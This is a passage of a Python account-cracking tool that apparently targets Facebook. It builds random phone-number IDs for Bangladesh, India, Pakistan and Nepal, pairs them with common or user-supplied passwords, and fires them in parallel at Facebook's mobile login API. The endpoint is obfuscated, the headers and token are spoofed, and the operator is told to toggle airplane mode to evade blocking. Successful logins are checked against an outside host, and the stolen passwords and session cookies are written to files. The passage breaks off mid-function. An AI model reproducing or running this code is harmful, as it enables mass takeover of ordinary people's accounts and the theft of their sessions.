            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _bangladesh_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green} 017 019 018 016 013');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[BD RANDOM 2]▬▭▬▭▬▭▬▭#
def _bangladesh2_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}01711 01125 01872 01993 01628');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _bangladesh2_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}01711 01125 01872 01993 01628');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    plist = []
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[IND RANDOM]▬▭▬▭▬▭▬▭#
def _india_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}+91902 +91639 +91934 +91701');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [love,ids, '57575751', '57273200', '59039200']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _india_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}+91902 +91639 +91934 +91701');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[PAK RANDOM]▬▭▬▭▬▭▬▭#
def _pakistan_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}0315 0345 0333');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            au = love[:6];bu = ids[:8];passlist = [love,ids,au,bu, 'khankhan', 'khan khan', 'khan1234', 'khan12345', 'Pakistan', '203040']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _pakistan_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}0315 0345 0333');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
 #▬▭▬▭▬▭▬▭[NEP RANDOM]▬▭▬▭▬▭▬▭#
def _nepal_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}9815 9814 9861 9840');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    linex()
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]');linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _nepal_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}9815 9814 9861 9840');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    linex()
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]');linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_tarek_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[RANDOM METHOD 1]▬▭▬▭▬▭▬▭#
def _method_one(ids,passlist,tl):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-R1{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    ua=(RM1)
    try:
        for pas in passlist:
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            data={
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': ua,
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                    print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/TAREK-TOOL/TAREK-RANDM-M1-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-RANDM-M1-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                #print(f'\r\r{rad}[TAREK•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/TAREK-TOOL/TAREK-RANDM-M1-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 2]▬▭▬▭▬▭▬▭#
def _method_two(ids,passlist,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{rad}[{green}TAREK-R2{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email': ids,
            'password': pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_US","client_country_code":"US",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{RM2}',
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
